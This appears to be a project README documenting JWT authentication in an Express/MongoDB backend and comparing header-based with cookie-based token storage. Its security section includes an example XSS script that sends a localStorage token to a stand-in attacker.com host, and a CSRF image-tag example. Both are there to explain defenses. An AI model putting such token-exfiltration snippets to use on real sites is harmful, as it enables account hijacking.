# backend_Project

# JWT Authentication System - Complete Guide

## 📚 Table of Contents
- [Core Components](#core-components)
- [Authentication Flow](#authentication-flow)
- [JWT in Header vs Cookie](#jwt-in-header-vs-cookie)
- [Security Comparison](#security-comparison)
- [Implementation Examples](#implementation-examples)
- [Best Practices](#best-practices)

---

## 🔐 Core Components

### 1. User Model (`user.model.js`)
Stores user data in MongoDB with the following fields:

- **email** (unique identifier)
- **password** (hashed with bcrypt)
- **channelName**, **phone**
- **logoUrl**, **logoId** (from Cloudinary)
- **subscribers** (count)
- **subscribedChannels** (array of user IDs)

### 2. Authentication Routes (`user.routes.js`)

#### 📝 Signup Flow (`POST /api/v1/user/signup`)
```
User submits → Password hashed → Image uploaded to Cloudinary → User saved to DB
```

**Process:**
1. Password is hashed using **bcrypt** (10 salt rounds)
2. Profile image uploaded to Cloudinary
3. User created in database
4. **No token returned** (user must login separately)

#### 🔑 Login Flow (`POST /api/v1/user/login`)
```
User submits credentials → Email lookup → Password verification → JWT generated → Token returned
```

**Process:**
1. **Find user** by email
2. **Verify password** using `bcrypt.compare()`
3. **Generate JWT token** with user data:
   ```javascript
   jwt.sign({
     _id, channelName, email, phone, logoId
   }, SECRET_KEY, { expiresIn: "10d" })
   ```
4. **Return token** + user data to client

**Token Payload Includes:**
- `_id` (user ID)
- `channelName`
- `email`
- `phone`
- `logoId`

**Token Expiration:** 10 days

### 3. Auth Middleware (`auth.middleware.js`)

The `checkAuth` middleware protects routes by verifying JWT tokens.

**Flow:**
```
Request → checkAuth Middleware → Token Validation → Attach User → Next()
```

**Step-by-Step Process:**

1. **Extract Token** from `Authorization` header:
   ```
   Authorization: "Bearer abc123xyz"
   → Token extracted: "abc123xyz"
   ```

2. **Check if Token Exists:**
   - If **no token** → `401 Unauthorized` ❌

3. **Verify Token:**
   ```javascript
   jwt.verify(token, process.env.JWT_TOKEN)
   ```
   - Decrypts token using secret key
   - Checks signature validity
   - Checks expiration

4. **Attach User to Request:**
   ```javascript
   req.user = decodedUser // Contains: _id, email, channelName, phone, logoId
   ```

5. **Call `next()`** to proceed to the route handler

**Error Scenarios:**
- **No token:** → 401 "No token is provided"
- **Invalid/Expired token:** → 500 "Something went wrong"

---

## 🛡️ Protected Routes

Routes using `checkAuth` middleware:

### 1. Update Profile (`PUT /api/v1/user/update-profile`)
```javascript
router.put("/update-profile", checkAuth, async(req, res) => {
  // req.user._id is available here!
})
```
- Updates channel name, phone, and logo
- Uses `req.user._id` to identify the user

### 2. Subscribe to Channel (`POST /api/v1/user/subscribe`)
```javascript
router.post("/subscribe", checkAuth, async(req, res) => {
  // req.user._id is the current logged-in user
})
```
- Adds channel to `subscribedChannels` array
- Increments subscriber count on target channel
- Prevents self-subscription

---

## 🔄 Complete Authentication Flow

### New User Registration:
```
1. POST /api/v1/user/signup
   └─ Email, password, channelName, phone, logoUrl
   
2. Password hashed (bcrypt)
3. Logo uploaded (Cloudinary)
4. User saved to MongoDB
5. Returns user object (NO TOKEN)
```

### User Login:
```
1. POST /api/v1/user/login
   └─ Email, password
   
2. Find user by email
3. Verify password (bcrypt.compare)
4. Generate JWT token (10-day expiration)
5. Return: user data + token
```

### Client Receives Token:
```javascript
// Client stores token (localStorage/sessionStorage)
const response = await fetch('/api/v1/user/login', {...})
const { token } = await response.json()
localStorage.setItem('token', token)
```

### Making Authenticated Requests:
```javascript
// Client sends token in headers
fetch('/api/v1/user/update-profile', {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
})
```

### Server Validates Request:
```
Request → checkAuth → jwt.verify() → req.user populated → Route handler
```

---

## 📊 Visual Flow Diagram

```
┌─────────────┐
│   Client    │
└──────┬──────┘
       │
       │ 1. POST /signup (email, password, etc.)
       ▼
┌─────────────────┐
│  Signup Route   │──→ Hash password → Upload image → Save user
└─────────────────┘
       │
       │ User must login separately
       │
       │ 2. POST /login (email, password)
       ▼
┌─────────────────┐
│  Login Route    │──→ Find user → Verify password → Generate JWT
└────────┬────────┘
         │
         │ 3. Returns: { token, user data }
         ▼
┌─────────────────┐
│     Client      │──→ Stores token in localStorage
└────────┬────────┘
         │
         │ 4. PUT /update-profile
         │    Headers: Authorization: Bearer <token>
         ▼
┌─────────────────┐
│  checkAuth      │──→ Extract token → Verify → Set req.user
│  Middleware     │
└────────┬────────┘
         │
         │ 5. next()
         ▼
┌─────────────────┐
│  Route Handler  │──→ Uses req.user._id to update profile
│  (Protected)    │
└─────────────────┘
```

---

## 🔑 Security Features

✅ **Password Hashing:** Bcrypt with 10 salt rounds  
✅ **JWT Tokens:** Signed with secret key (`process.env.JWT_TOKEN`)  
✅ **Token Expiration:** 10 days  
✅ **Unique Email:** Database constraint  
✅ **Authorization Header:** Standard `Bearer <token>` format  
✅ **Protected Routes:** Middleware guards sensitive operations  

---

## ⚙️ Environment Variables Required

Your `.env` file should contain:
```env
JWT_TOKEN=your_secret_key_here
PORT=your_port_number
# Database connection string
# Cloudinary credentials
```

---

# JWT in Header vs JWT in Cookie

## 🔐 JWT in Header (Current Implementation)

### How It Works:

**Client-Side (Frontend):**
```javascript
// 1. After login, store token
const { token } = await loginResponse.json();
localStorage.setItem('token', token);

// 2. Send token with every request
fetch('/api/v1/user/update-profile', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**Server-Side (Backend):**
```javascript
// Extract from header
const token = req.headers.authorization?.split(" ")[1];
const decoded = jwt.verify(token, SECRET);
```

### Characteristics:

| Feature | Details |
|---------|---------|
| **Storage** | `localStorage` / `sessionStorage` (client manually stores) |
| **Transmission** | Manually included in every request header |
| **Access** | JavaScript has full access to the token |
| **Expiration** | Only JWT expiration (no browser-level expiration) |
| **Scope** | Same-origin only (unless CORS configured) |

---

## 🍪 JWT in Cookie

### How It Works:

**Server-Side (Backend):**
```javascript
// Login route - SET cookie
router.post("/login", async (req, res) => {
  // ... verify user ...
  
  const token = jwt.sign({ _id, email }, SECRET, { expiresIn: "10d" });
  
  // Set as HTTP-only cookie
  res.cookie('token', token, {
    httpOnly: true,        // JavaScript can't access
    secure: true,          // HTTPS only
    sameSite: 'strict',    // CSRF protection
    maxAge: 10 * 24 * 60 * 60 * 1000  // 10 days
  });
  
  res.json({ message: "Login successful" });
});
```

**Client-Side (Frontend):**
```javascript
// 1. Login (NO manual token storage needed)
await fetch('/api/v1/user/login', {
  method: 'POST',
  credentials: 'include'  // Important! Include cookies
});

// 2. Make authenticated requests (cookie sent automatically!)
fetch('/api/v1/user/update-profile', {
  credentials: 'include'  // Browser auto-sends cookie
});
```

**Server-Side (Middleware):**
```javascript
export const checkAuth = (req, res, next) => {
  try {
    // Extract from cookie instead of header
    const token = req.cookies.token;
    
    if (!token) {
      return res.status(401).json({ error: "Not authenticated" });
    }
    
    const decoded = jwt.verify(token, process.env.JWT_TOKEN);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(500).json({ error: "Invalid token" });
  }
};
```

### Characteristics:

| Feature | Details |
|---------|---------|
| **Storage** | Browser manages cookies automatically |
| **Transmission** | Automatically sent with every request to same domain |
| **Access** | JavaScript **CANNOT** access (if `httpOnly: true`) |
| **Expiration** | Both JWT and cookie expiration |
| **Scope** | Can work cross-subdomain with proper settings |

---

## 📊 Side-by-Side Comparison

| Aspect | **JWT in Header** | **JWT in Cookie** |
|--------|-------------------|-------------------|
| **Security (XSS)** | ❌ Vulnerable - JS can steal from localStorage | ✅ Protected with `httpOnly` flag |
| **Security (CSRF)** | ✅ Not affected | ⚠️ Vulnerable (needs `sameSite` protection) |
| **Implementation** | ⚠️ Manual - client handles storage/headers | ✅ Automatic - browser manages |
| **Mobile Apps** | ✅ Easy to implement | ❌ Harder (no cookie support in native apps) |
| **Cross-Origin** | ✅ Easy with CORS headers | ⚠️ Complex (needs credentials + CORS) |
| **Token Access** | ✅ JS can read token | ❌ JS cannot read (if httpOnly) |
| **Logout** | ⚠️ Manual - delete from localStorage | ✅ Server clears cookie |
| **Debugging** | ✅ Easy to inspect in JS console | ⚠️ Harder - need browser DevTools |

---

## 🛡️ Security Deep Dive

### XSS (Cross-Site Scripting) Attacks

**Header Approach (Vulnerable):**
```javascript
// Attacker injects malicious script
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>
```
❌ **Token stolen!** Attacker can impersonate user.

**Cookie Approach (Protected):**
```javascript
<script>
  const token = document.cookie; // Returns empty if httpOnly!
</script>
```
✅ **Token safe!** JavaScript cannot access httpOnly cookies.

---

### CSRF (Cross-Site Request Forgery) Attacks

**Cookie Approach (Vulnerable without protection):**
```html
<!-- Attacker's website -->
<img src="https://yoursite.com/api/v1/user/delete-account">
```
❌ Browser automatically sends cookie → Unauthorized action!

**Protection:**
```javascript
res.cookie('token', token, {
  sameSite: 'strict'  // Only send cookie for same-site requests
});
```
✅ **Protected!** Cookie won't be sent from attacker's site.

**Header Approach (Not affected):**
- Authorization header is NOT sent automatically
- Attacker cannot include custom headers from their site

---

## 🔄 Converting Your Project to Cookie-Based Auth

### Required Changes:

#### 1. Install cookie-parser
```bash
npm install cookie-parser
```

#### 2. Update `index.js`
```javascript
import cookieParser from 'cookie-parser';

app.use(cookieParser());
```

#### 3. Update Login Route
```javascript
router.post("/login", async (req, res) => {
  // ... existing verification code ...
  
  const token = jwt.sign({ /* ... */ }, process.env.JWT_TOKEN, { 
    expiresIn: "10d" 
  });
  
  // Set cookie instead of sending in JSON
  res.cookie('token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 10 * 24 * 60 * 60 * 1000
  });
  
  // Don't send token in response
  res.status(200).json({
    _id: existingUser._id,
    channelName: existingUser.channelName,
    email: existingUser.email,
    // ... other fields (NO TOKEN)
  });
});
```

#### 4. Update Middleware
```javascript
export const checkAuth = async (req, res, next) => {
  try {
    const token = req.cookies.token; // Changed from req.headers.authorization
    
    if (!token) {
      return res.status(401).json({ error: "No token provided" });
    }
    
    const decodedUser = jwt.verify(token, process.env.JWT_TOKEN);
    req.user = decodedUser;
    next();
  } catch (error) {
    res.status(500).json({ error: "Invalid token" });
  }
};
```

#### 5. Add Logout Route
```javascript
router.post("/logout", (req, res) => {
  res.clearCookie('token');
  res.json({ message: "Logged out successfully" });
});
```

#### 6. Frontend Changes
```javascript
// Login - no manual storage needed!
await fetch('/api/v1/user/login', {
  method: 'POST',
  credentials: 'include',  // CRITICAL!
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password })
});

// Authenticated requests
await fetch('/api/v1/user/update-profile', {
  credentials: 'include'  // Auto-sends cookie
});
```

---

## 🎯 Which Approach Should You Use?

### Use JWT in Header if:
✅ Building a mobile app (React Native, Flutter)  
✅ Need simple implementation  
✅ Building a pure API service  
✅ Want easy debugging  
✅ Need to send token to multiple domains  

### Use JWT in Cookie if:
✅ Building a traditional web app  
✅ Security is top priority  
✅ Want automatic session management  
✅ Can implement CSRF protection  
✅ Frontend and backend on same/sub-domain  

---

## 🏆 Best Practice: Hybrid Approach

```javascript
// Send token in BOTH cookie AND response
router.post("/login", async (req, res) => {
  const token = jwt.sign({ /* ... */ }, SECRET, { expiresIn: "10d" });
  
  // Set httpOnly cookie for web
  res.cookie('token', token, { httpOnly: true, /* ... */ });
  
  // Also send in response for mobile apps
  res.json({
    user: { /* ... */ },
    token: token  // Mobile apps can use this
  });
});

// Middleware accepts BOTH
export const checkAuth = (req, res, next) => {
  const token = req.cookies.token || 
                req.headers.authorization?.split(" ")[1];
  // ... verify token ...
};
```

---

## 💡 Key Takeaways

1. **Stateless Authentication:** JWT tokens carry user identity (no server-side sessions)
2. **Client Responsibility:** Frontend must store token and include in headers (Header approach)
3. **Middleware Pattern:** `checkAuth` reusable across all protected routes
4. **User Context:** `req.user` automatically available in protected routes
5. **Two-Step Process:** Signup → Login (separate flows)
6. **Security Trade-offs:** Header approach = XSS risk; Cookie approach = CSRF risk
7. **Choose wisely:** Based on your application type and security requirements

---

## 📝 Summary Table

| | **JWT in Header (Current)** | **JWT in Cookie** |
|---|--------------------------|-------------------|
| **How it works** | Manual localStorage + Authorization header | Automatic browser cookies |
| **Security** | Vulnerable to XSS | Protected from XSS, vulnerable to CSRF |
| **Best for** | APIs, mobile apps, SPAs | Traditional web apps |
| **Complexity** | Simple to implement | Requires cookie-parser + CSRF protection |

---

**Your current header-based approach is perfectly valid and commonly used!** Cookie-based auth is an alternative with different trade-offs. Choose based on your specific security requirements and application architecture.

---

*This guide covers a standard, production-ready JWT authentication pattern widely used in Node.js/Express applications.*
